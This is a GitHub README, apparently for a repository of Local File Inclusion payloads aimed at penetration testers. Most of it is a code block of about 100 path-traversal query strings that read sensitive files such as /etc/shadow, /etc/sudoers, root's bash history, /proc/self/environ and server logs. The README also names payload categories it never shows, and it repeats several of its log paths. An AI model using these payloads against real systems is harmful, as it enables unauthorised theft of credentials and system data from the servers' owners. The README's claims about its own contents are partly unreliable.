# 🚀 LFI Payloads

Welcome to **LFI Payloads**! This repository is designed to help security researchers and penetration testers identify and exploit **Local File Inclusion (LFI)** vulnerabilities with effective payloads. 🛡️
<div align="center">
      <a href="https://www.whatsapp.com/channel/0029Vb68FeRFnSzGNOZC3h3x"><img src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=WhatsApp+Channel&amp;color=25D366&amp;logo=&amp;logoColor=FFFFFF&amp;label=" alt="WhatsApp Channel"></a>
  <a href="https://t.me/HackerSecure"><img src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=Telegram+Channel&amp;color=24A1DE&amp;logo=&amp;logoColor=FFFFFF&amp;label=" alt="Telegram Channel"></a>
  <a href="https://www.linkedin.com/in/cybersecurity-pentester/"><img src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=LinkedIn&amp;color=0A66C2&amp;logo=LinkedIn&amp;logoColor=FFFFFF&amp;label=" alt="LinkedIn"></a>
  <a href="https://linktr.ee/yogsec"><img src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=LinkTree&amp;color=25D366&amp;logo=&amp;logoColor=FFFFFF&amp;label=" alt="WhatsApp Channel"></a>
  <a href="https://x.com/home"><img src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=X&amp;color=000000&amp;logo=&amp;logoColor=FFFFFF&amp;label=" alt="Lichess"></a>
  <a href="mailto:abhinavsingwal@gmail.com?subject=Hi%20YogSec%20,%20nice%20to%20meet%20you!"><img alt="Email" src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=Gmail&amp;color=EA4335&amp;logo=Gmail&amp;logoColor=FFFFFF&amp;label="></a>
  <a href="https://yogsec.github.io/yogsec/"><img src="https://img.shields.io/static/v1?style=for-the-badge&amp;message=Website&amp;color=FFFFC5&amp;logo=&amp;logoColor=FFFFFF&amp;label=" alt="Telegram Channel"></a>  
  
</div>

---

## 📂 What is LFI?
**Local File Inclusion (LFI)** is a web vulnerability that allows an attacker to include files on a server through the web browser. This can potentially lead to:

- 🕵️‍♂️ Information Disclosure
- 🐍 Code Execution
- 🔥 Server Compromise

---

## 📜 Payloads
This repository contains various payloads categorized for easy access:

✅ **Basic Payloads**  
✅ **Encoding Techniques**  
✅ **Traversal Techniques**  
✅ **Wrapper Bypass**  
✅ **PHP Filters**  
✅ **Log Poisoning Payloads**

### 🔥 100 Common LFI Payloads
```
?page=../../../../etc/passwd
?page=../../../../etc/hosts
?page=../../../../windows/win.ini
?page=../../../../boot.ini
?page=../../../../etc/shadow
?page=../../../../etc/group
?page=../../../../proc/self/environ
?page=../../../../var/log/apache2/access.log
?page=../../../../var/log/apache2/error.log
?page=../../../../var/log/httpd/access.log
?page=../../../../var/log/httpd/error.log
?page=../../../../usr/local/apache/logs/access_log
?page=../../../../usr/local/apache/logs/error_log
?page=../../../../var/lib/mysql/mysql.sock
?page=../../../../etc/httpd/httpd.conf
?page=../../../../etc/apache2/apache2.conf
?page=../../../../etc/httpd/conf/httpd.conf
?page=../../../../etc/httpd/conf.d/vhosts.conf
?page=../../../../etc/nginx/nginx.conf
?page=../../../../etc/nginx/sites-enabled/default
?page=../../../../etc/ssl/openssl.cnf
?page=../../../../var/www/html/index.php
?page=../../../../home/user/.bash_history
?page=../../../../root/.bash_history
?page=../../../../etc/issue
?page=../../../../etc/network/interfaces
?page=../../../../etc/resolv.conf
?page=../../../../etc/hostname
?page=../../../../etc/hosts.allow
?page=../../../../etc/hosts.deny
?page=../../../../etc/security/opasswd
?page=../../../../etc/mtab
?page=../../../../etc/fstab
?page=../../../../etc/sudoers
?page=../../../../etc/pam.conf
?page=../../../../etc/profile
?page=../../../../etc/shells
?page=../../../../etc/inittab
?page=../../../../etc/passwd-
?page=../../../../etc/group- 
?page=../../../../etc/shadow- 
?page=../../../../etc/gshadow- 
?page=../../../../var/backups/passwd
?page=../../../../var/backups/group
?page=../../../../var/backups/shadow
?page=../../../../var/backups/gshadow
?page=../../../../dev/mem
?page=../../../../dev/kmem
?page=../../../../dev/port
?page=../../../../proc/mounts
?page=../../../../proc/partitions
?page=../../../../proc/version
?page=../../../../proc/self/status
?page=../../../../proc/self/cmdline
?page=../../../../proc/self/fd
?page=../../../../proc/self/maps
?page=../../../../proc/self/mountinfo
?page=../../../../proc/self/io
?page=../../../../proc/self/limits
?page=../../../../proc/self/cgroup
?page=../../../../proc/self/net/tcp
?page=../../../../proc/self/net/udp
?page=../../../../proc/self/net/raw
?page=../../../../proc/self/net/unix
?page=../../../../proc/self/net/snmp
?page=../../../../proc/self/net/dev
?page=../../../../proc/self/net/ip_conntrack
?page=../../../../proc/self/net/route
?page=../../../../proc/self/net/arp
?page=../../../../proc/self/net/fib_trie
?page=../../../../proc/self/net/netfilter
?page=../../../../var/run/utmp
?page=../../../../var/log/wtmp
?page=../../../../var/log/btmp
?page=../../../../var/log/lastlog
?page=../../../../var/run/utmpx
?page=../../../../var/log/wtmpx
?page=../../../../var/log/btmpx
?page=../../../../var/log/faillog
?page=../../../../var/log/auth.log
?page=../../../../var/log/secure
?page=../../../../var/log/messages
?page=../../../../var/log/syslog
?page=../../../../var/log/kern.log
?page=../../../../var/log/maillog
?page=../../../../var/log/yum.log
?page=../../../../var/log/dpkg.log
?page=../../../../var/log/apt/history.log
?page=../../../../var/log/apt/term.log
?page=../../../../var/log/aptitude
?page=../../../../var/log/boot.log
?page=../../../../var/log/cron
?page=../../../../var/log/daemon.log
?page=../../../../var/log/debug
?page=../../../../var/log/lpr.log
?page=../../../../var/log/user.log
?page=../../../../var/log/xferlog
?page=../../../../var/log/mail.info
?page=../../../../var/log/mail.warn
?page=../../../../var/log/mail.err
?page=../../../../var/log/httpd/access.log
?page=../../../../var/log/httpd/error.log
?page=../../../../var/log/apache2/access.log
?page=../../../../var/log/apache2/error.log
```

---

## ⚙️ Usage
1. Clone the repository:
   ```bash
   git clone https://github.com/your-username/LFI-Payloads.git
   ```
2. Navigate to the folder:
   ```bash
   cd LFI-Payloads
   ```
3. Use the categorized payloads as per your testing requirements.

